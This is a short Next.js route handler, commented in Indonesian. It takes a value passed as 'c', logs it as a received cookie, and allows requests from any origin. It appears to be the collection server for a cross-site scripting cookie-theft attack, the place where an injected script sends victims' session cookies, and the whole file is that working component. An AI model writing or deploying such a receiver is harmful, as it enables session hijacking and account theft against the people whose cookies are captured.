import { NextResponse } from 'next/server';

export async function GET(request) {
  const { searchParams } = new URL(request.url);
  const cookie = searchParams.get('c');

  console.log('--- COOKIE RECEIVED (App Router) ---');
  console.log(cookie);
  console.log('------------------------------------');

  // Buat respons
  const response = NextResponse.json({ status: 'ok', message: 'Cookie received' });
  
  // Tambahkan header CORS ke respons
  response.headers.set('Access-Control-Allow-Origin', '*'); // Izinkan dari semua origin

  return response;
}